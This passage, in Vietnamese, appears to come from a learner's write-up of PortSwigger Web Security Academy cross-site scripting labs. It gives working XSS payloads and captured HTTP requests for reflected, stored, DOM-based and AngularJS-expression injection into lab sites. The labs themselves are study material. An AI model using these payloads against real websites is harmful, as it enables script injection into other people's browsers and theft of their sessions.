+<p>Tuy nhiên, chỉ khi hash thay đổi thì code mới được đưa vào <code>$()</code> để parse ⇒ cần làm một cái nào đó tự đổi path ⇒ dùng <code>iframe</code> để load sau đó dùng <code>this.src+=xxxx</code> để đổi hash đồng thời t truyền chuỗi cộng thêm chính là payload. Nhờ đó chúng ta có payload sau</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">iframe</span><span class="w"> </span><span class="na">src</span><span class="o">=</span><span class="s">&#39;https://0aa400230361f1e0804c031c001900a0.web-security-academy.net&#39;</span><span class="w"> </span><span class="na">onload</span><span class="o">=</span><span class="s">&#39;this.src+=&quot;#&lt;img src=x onerror=print()&gt;&quot;&#39;</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Exploit server</p>
+<ul>
+<li>
+<p>Header</p>
+<div class="highlight"><pre><span></span><code><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span><span class="w"> </span><span class="mf">200</span><span class="w"> </span><span class="nx">OK</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">;</span><span class="w"> </span><span class="nx">charset</span><span class="o">=</span><span class="nx">utf</span><span class="o">-</span><span class="mf">8</span>
+</code></pre></div>
+</li>
+<li>
+<p>Body</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">iframe</span><span class="w"> </span><span class="na">src</span><span class="o">=</span><span class="s">&#39;https://0aa400230361f1e0804c031c001900a0.web-security-academy.net&#39;</span><span class="w"> </span><span class="na">onload</span><span class="o">=</span><span class="s">&#39;this.src+=&quot;#&lt;img src=x onerror=print()&gt;&quot;&#39;</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Full config</p>
+<p><img alt="image.png" src="image%2013.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện view exploit, nhận thấy print() được thực hiện</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2014.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Deliver to victim và hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2015.png" /></p>
+</li>
+</ul>
+<h1 id="lab-reflected-xss-into-attribute-with-angle-brackets-html-encoded"><strong>Lab: Reflected XSS into attribute with angle brackets HTML-encoded</strong><a class="headerlink" href="#lab-reflected-xss-into-attribute-with-angle-brackets-html-encoded" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded">Lab: Reflected XSS into attribute with angle brackets HTML-encoded | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện điều hướng đến chức năng <code>Search</code> . Tại đây thưc hiện truyền payload sau và quan sát thấy các ký tự <code>&lt;&gt;</code> đã bị encoded nhưng vẫn escape được dấu <code>"</code></p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="nx">abc</span><span class="err">&quot;</span><span class="o">&gt;</span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2016.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Chúng ta có thể chỉ dùng event cho thẻ input ⇒ không cần dùng <code>&lt;&gt;</code> . Và chúng ta đã escape <code>"</code> nên hoàn toàn thêm event được. Payload như sau:</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="nx">abc</span><span class="s2">&quot; autofocus=&quot;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span>
+</code></pre></div>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2017.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2018.png" /></p>
+</li>
+</ul>
+<h1 id="lab-stored-xss-into-anchor-href-attribute-with-double-quotes-html-encoded"><strong>Lab: Stored XSS into anchor <code>href</code> attribute with double quotes HTML-encoded</strong><a class="headerlink" href="#lab-stored-xss-into-anchor-href-attribute-with-double-quotes-html-encoded" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded">Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện chọn một sản phẩm, điều hướng đến chức năng comment và comment hợp lệ</p>
+<p><img alt="image.png" src="image%2019.png" /></p>
+</li>
+<li>
+<p>Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API <code>POST /post/comment</code> . Thay đổi tham số <code>website</code> thành payload dùng scheme <code>javascript</code> .</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="nx">javascript</span><span class="o">:</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span>
+</code></pre></div>
+</li>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">post</span><span class="o">/</span><span class="nx">comment</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">a6100b3042b106a83784746003900a7</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">tNGHUtQki0BgWL3qHwoomFQflHCeda6q</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">222</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a6100b3042b106a83784746003900a7.web-security-academy.net</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a6100b3042b106a83784746003900a7.web-security-academy.net/post?postId=4</span>
+<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">navigate</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">User</span><span class="o">:</span><span class="w"> </span><span class="o">?</span><span class="mf">1</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="nx">csrf</span><span class="o">=</span><span class="mf">4</span><span class="nx">jYdEC17S52SFUSwo8a61nBeNoHEYQgi</span><span class="o">&amp;</span><span class="nx">postId</span><span class="o">=</span><span class="mf">4</span><span class="o">&amp;</span><span class="nx">comment</span><span class="o">=%</span><span class="mf">27</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">3</span><span class="nx">E</span><span class="o">%</span><span class="mf">3</span><span class="nx">Cimg</span><span class="o">+</span><span class="nx">src</span><span class="o">%</span><span class="mf">3</span><span class="nx">Dx</span><span class="o">+</span><span class="nx">onerror</span><span class="o">%</span><span class="mf">3</span><span class="nx">Dalert</span><span class="o">%</span><span class="mf">28</span><span class="o">%</span><span class="mf">22</span><span class="nx">cmt</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">3</span><span class="nx">E</span><span class="o">&amp;</span><span class="nx">name</span><span class="o">=%</span><span class="mf">27</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">3</span><span class="nx">E</span><span class="o">%</span><span class="mf">3</span><span class="nx">Cimg</span><span class="o">+</span><span class="nx">src</span><span class="o">%</span><span class="mf">3</span><span class="nx">Dx</span><span class="o">+</span><span class="nx">onerror</span><span class="o">%</span><span class="mf">3</span><span class="nx">Dalert</span><span class="o">%</span><span class="mf">28</span><span class="o">%</span><span class="mi">22n</span><span class="nx">ame</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">3</span><span class="nx">E</span><span class="o">&amp;</span><span class="nx">email</span><span class="o">=</span><span class="nx">a</span><span class="o">%</span><span class="mf">40</span><span class="nx">a</span><span class="p">.</span><span class="nx">com</span><span class="o">&amp;</span><span class="nx">website</span><span class="o">=</span><span class="nx">javascript</span><span class="o">%</span><span class="mf">3</span><span class="nx">aalert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi request, quan sát thấy alert thành công. Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2020.png" /></p>
+<p><img alt="image.png" src="image%2021.png" /></p>
+</li>
+</ul>
+<h1 id="lab-reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded"><strong>Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded</strong><a class="headerlink" href="#lab-reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded">Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện điều hướng đến chức năng <code>Search</code>.</p>
+<p><img alt="image.png" src="image%2022.png" /></p>
+</li>
+<li>
+<p>Tại đây, thực hiện truyền payload sau vào và nhận thấy các ký tự <code>&lt;&gt;</code> đã bị encode.</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="err">&#39;&quot;</span><span class="o">&gt;</span><span class="p">&lt;</span><span class="nt">img</span><span class="w"> </span><span class="na">src</span><span class="o">=</span><span class="na">x</span><span class="w"> </span><span class="na">onerror</span><span class="o">=</span><span class="na">alert</span><span class="err">(</span><span class="na">1</span><span class="err">)</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2023.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Tuy nhiên, với vị chí được đẩy vào trong thẻ <code>&lt;script&gt;&lt;/script&gt;</code> thì không cần dấu <code>&lt;&gt;</code> mà chỉ cần lệnh là chạy được js. Chúng ta chỉ cần escape dấu <code>"</code> và thực hiện chèn lệnh khác bằng payload sau:</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="err">&#39;</span><span class="p">;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="c1">//</span>
+</code></pre></div>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2024.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2025.png" /></p>
+</li>
+</ul>
+<h1 id="lab-dom-xss-in-documentwrite-sink-using-source-locationsearch-inside-a-select-element"><strong>Lab: DOM XSS in <code>document.write</code> sink using source <code>location.search</code> inside a select element</strong><a class="headerlink" href="#lab-dom-xss-in-documentwrite-sink-using-source-locationsearch-inside-a-select-element" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element">Lab: DOM XSS in document.write sink using source location.search inside a select element | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện chọn một sản phẩm bất kỳ. Thực hiện view source, quan sát thấy có script sau lấy param <code>storeId</code> và đẩy vào source <code>document.write</code> .</p>
+<ul>
+<li>
+<p>Code</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">stores</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;London&quot;</span><span class="p">,</span><span class="s2">&quot;Paris&quot;</span><span class="p">,</span><span class="s2">&quot;Milan&quot;</span><span class="p">];</span>
+<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">store</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="ow">new</span><span class="w"> </span><span class="nx">URLSearchParams</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">)).</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;storeId&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;select name=&quot;storeId&quot;&gt;&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="nx">store</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;option selected&gt;&#39;</span><span class="o">+</span><span class="nx">store</span><span class="o">+</span><span class="s1">&#39;&lt;/option&gt;&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">for</span><span class="p">(</span><span class="kd">var</span><span class="w"> </span><span class="nx">i</span><span class="o">=</span><span class="mf">0</span><span class="p">;</span><span class="nx">i</span><span class="p">&lt;</span><span class="nt">stores</span><span class="p">.</span><span class="na">length</span><span class="err">;</span><span class="na">i</span><span class="err">++)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="na">if</span><span class="err">(</span><span class="na">stores</span><span class="err">[</span><span class="na">i</span><span class="err">]</span><span class="w"> </span><span class="err">===</span><span class="w"> </span><span class="na">store</span><span class="err">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="na">continue</span><span class="err">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="na">document.write</span><span class="err">(&#39;&lt;</span><span class="na">option</span><span class="p">&gt;</span><span class="s1">&#39;+stores[i]+&#39;</span><span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span><span class="s1">&#39;);</span>
+<span class="s1">    }</span>
+<span class="s1">    document.write(&#39;</span><span class="p">&lt;/</span><span class="nt">select</span><span class="p">&gt;</span><span class="err">&#39;</span><span class="p">);</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Tại đây, vì mọi thứ đẩy vào trong thẻ <code>&lt;option&gt;&lt;/option&gt;</code> và <code>&lt;select&gt;&lt;/select&gt;</code> sẽ đều bị coi là text ⇒ cần kết thúc sớm hai thẻ này và thêm code alert riêng của chúng ta</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="o">&amp;</span><span class="nx">storeId</span><span class="o">=</span><span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;&lt;/</span><span class="nt">select</span><span class="p">&gt;&lt;</span><span class="nt">img</span><span class="w"> </span><span class="na">src</span><span class="o">=</span><span class="na">x</span><span class="w"> </span><span class="na">onerror</span><span class="o">=</span><span class="na">alert</span><span class="err">(</span><span class="na">1</span><span class="err">)</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>URL</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">vuln</span><span class="err">-</span><span class="na">web</span><span class="w"> </span><span class="na">url</span><span class="p">&gt;</span><span class="o">/</span><span class="nx">product</span><span class="o">?</span><span class="nx">productId</span><span class="o">=</span><span class="mf">1</span><span class="o">&amp;</span><span class="nx">storeId</span><span class="o">=%</span><span class="mf">3</span><span class="nx">C</span><span class="o">/</span><span class="nx">option</span><span class="o">%</span><span class="mf">3</span><span class="nx">E</span><span class="o">%</span><span class="mf">3</span><span class="nx">C</span><span class="o">/</span><span class="nx">select</span><span class="o">%</span><span class="mf">3</span><span class="nx">E</span><span class="o">%</span><span class="mf">3</span><span class="nx">Cimg</span><span class="o">%</span><span class="mf">20</span><span class="nx">src</span><span class="o">=</span><span class="nx">x</span><span class="o">%</span><span class="mf">20</span><span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">%</span><span class="mf">3</span><span class="nx">E</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Gửi URL trên, alert thành công</p>
+<p><img alt="image.png" src="image%2026.png" /></p>
+</li>
+<li>
+<p>Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2027.png" /></p>
+</li>
+</ul>
+<h1 id="lab-dom-xss-in-angularjs-expression-with-angle-brackets-and-double-quotes-html-encoded"><strong>Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded</strong><a class="headerlink" href="#lab-dom-xss-in-angularjs-expression-with-angle-brackets-and-double-quotes-html-encoded" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression">Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện sử dụng chức năng <code>search</code> với payload sau:</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="err">&#39;&quot;</span><span class="o">&gt;</span><span class="p">&lt;</span><span class="nt">img</span><span class="w"> </span><span class="na">src</span><span class="o">=</span><span class="na">x</span><span class="w"> </span><span class="na">onerror</span><span class="o">=</span><span class="na">alert</span><span class="err">(</span><span class="na">1</span><span class="err">)</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Chức năng</p>
+<p><img alt="image.png" src="image%2028.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện kiểm tra bằng inspect thì nhận thấy <code>&lt;&gt;</code> đã bị encode (bởi vì dấu của chúng ta truyền vào không được hiển thị giống với dấu khác trong src code; nếu kiểm tra bằng view source thì sẽ thấy encode của dấu này) → không thực thi js được. Tuy nhiên lại phát hiện thấy có angular (<code>ng-app</code>) → có hướng mới</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2029.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Truyền payload <code>{{7*7}}</code> và nhận thấy ra <code>49</code> → input được angular parse</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="p">{{</span><span class="mf">7</span><span class="o">*</span><span class="mf">7</span><span class="p">}}</span>
+</code></pre></div>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2030.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện tìm hiểu về angular expression dựa trên bài viết này <a href="https://portswigger.net/research/dom-based-angularjs-sandbox-escapes">https://portswigger.net/research/dom-based-angularjs-sandbox-escapes</a></p>
+</li>
+<li>
+<p>Cụ thể khi constructor 2 lần thì chúng ta có thể nhận lại được một function</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="p">{{[].</span><span class="kr">constructor</span><span class="p">.</span><span class="kr">constructor</span><span class="p">}}</span>
+</code></pre></div>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2031.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Sau đó thì để thực thi được <code>alert(1)</code> chỉ cần truyền payload như sau là gọi được hàm</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="p">{{</span><span class="w"> </span><span class="p">[].</span><span class="kr">constructor</span><span class="p">.</span><span class="kr">constructor</span><span class="p">(</span><span class="s1">&#39;alert(1)&#39;</span><span class="p">)()}}</span>
+</code></pre></div>
+</li>
+<li>
+<p>Giải thích: <code>Function constructor</code>  khi pass param vào nó sẽ tạo hàm và chạy hàm đó khi constructor được theo MDN</p>
+<p><img alt="image.png" src="image%2032.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện truyền payload trên, quan sát thấy alert thành công. Hoàn thành giải lab</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2033.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-reflected-dom-xss"><strong>Lab: Reflected DOM XSS</strong><a class="headerlink" href="#lab-reflected-dom-xss" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected">Lab: Reflected DOM XSS | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Điều hướng đến chức năng <code>search</code> . Thực hiện <code>search</code> . Nhạn thấy các ký tự <code>&lt;&gt;</code> ở chức năng search đã bị encode</p>
+<p><img alt="image.png" src="image%2034.png" /></p>
+</li>
+<li>
+<p>Thực hiện sửa dụng Burp Invader để tìm các sink source có thể có</p>
+<ul>
+<li>
+<p>Config</p>
+<p><img alt="image.png" src="image%2035.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Sau đó, chọn stacktrace để tìm đến được source</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2036.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện đọc stack trace suy ra được vị trí lỗi</p>
+<ul>
+<li>
+<p>Source: URL <a href="https://0a5f008e03a198fc81e0664e00970036.web-security-academy.net/"><code>https://0a5f008e03a198fc81e0664e00970036.web-security-academy.net/</code></a> param: <code>search</code></p>
+<div class="highlight"><pre><span></span><code><span class="nx">https</span><span class="o">:</span><span class="c1">//0a5f008e03a198fc81e0664e00970036.web-security-academy.net/?search=abc</span>
+</code></pre></div>
+</li>
+<li>
+<p>Sink: hàm <code>eval</code></p>
+<div class="highlight"><pre><span></span><code><span class="nb">eval</span><span class="p">(</span><span class="s1">&#39;var searchResultsObj = &#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
+</code></pre></div>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2037.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Hàm <code>eval</code> sẽ lấy response trả về của request gửi tới API <code>GET /search-results?search=</code> và trực tiếp chạy lệnh. Ví dụ, nếu truyền <code>abc</code> thì <code>responseText</code> sẽ là <code>{"results":[],"searchTerm":"abc"}</code> . Với việc sử dụng hàm evil <code>eval('var searchResultsObj = ' + this.responseText);</code> thì thực chất evil sẽ thực hiện lệnh sau:</p>
+<div class="highlight"><pre><span></span><code><span class="kd">var</span><span class="w"> </span><span class="nx">searchResultsObj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s2">&quot;results&quot;</span><span class="o">:</span><span class="p">[],</span><span class="s2">&quot;searchTerm&quot;</span><span class="o">:</span><span class="s2">&quot;abc&quot;</span><span class="p">}</span>
+</code></pre></div>
+</li>
+<li>
+<p>User có thể kiểm soát input truyền vào searchTerm → escape dấu <code>"</code> như sau để khiến cho evil thực hiện một câu lệnh js khác</p>
+<div class="highlight"><pre><span></span><code><span class="kd">var</span><span class="w"> </span><span class="nx">searchResultsObj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s2">&quot;results&quot;</span><span class="o">:</span><span class="p">[],</span><span class="s2">&quot;searchTerm&quot;</span><span class="o">:</span><span class="s2">&quot;abc&quot;</span><span class="p">;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="c1">//&quot;}</span>
+</code></pre></div>
+</li>
+<li>
+<p>Để thực hiện điều này, chúng ta chỉ cần truyển phần <code>abc"};alert(1)//"}</code> là được. Tuy nhiên, cách làm này không đúng ý vì dấu <code>"</code> chúng ta truyền vào tự động bị escape bởi dấu <code>\</code> khiến nó chỉ là data text bình thường → cần escape cả dấu <code>\</code> của code xử lý thêm vào</p>
+<p><img alt="image.png" src="image%2038.png" /></p>
+</li>
+<li>
+<p>Thực hiện truyền payload mới như sau <code>abc\"};alert(1)//"}</code> . Thực hiện trigger thành công. Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2039.png" /></p>
+<p><img alt="image.png" src="image%2040.png" /></p>
+</li>
+</ul>
+<h1 id="lab-stored-dom-xss"><strong>Lab: Stored DOM XSS</strong><a class="headerlink" href="#lab-stored-dom-xss" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored">Lab: Stored DOM XSS | Web Security Academy</a></p>
+<ul>
+<li>Thực hiện xem một sản phẩm bất kỳ.</li>
+<li>
+<p>Thực hiện comment một bài viết với payload sau, nhận thấy các dấu <code>&lt;&gt;</code> đã bị encode</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="err">&#39;&quot;</span><span class="o">&gt;</span><span class="p">&lt;</span><span class="nt">img</span><span class="w"> </span><span class="na">src</span><span class="o">=</span><span class="na">x</span><span class="w"> </span><span class="na">onerror</span><span class="o">=</span><span class="na">alert</span><span class="err">(</span><span class="na">1</span><span class="err">)</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2041.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Tuy nhiên, khi quan sát chúng ta thấy dữ liệu trong response trả về không bị encode ⇒ browser xử lý encode ⇒ đọc js. Thực hiện đọc file js xử lý ở path <code>/resources/js/loadCommentsWithVulnerableEscapeHtml.js</code> . Nhận thấy có đoạn <code>escapeHTML</code> nhưng chưa xử lý tốt mới chỉ xử lý các dấu <code>&lt;&gt;</code> xuất hiện lần đầu</p>
+<ul>
+<li>
+<p>Code</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">escapeHTML</span><span class="p">(</span><span class="nx">html</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">html</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s1">&#39;&lt;&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&amp;lt;&#39;</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&amp;gt;&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+</code></pre></div>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2042.png" /></p>
+</li>
+</ul>
+</li>
+<li>
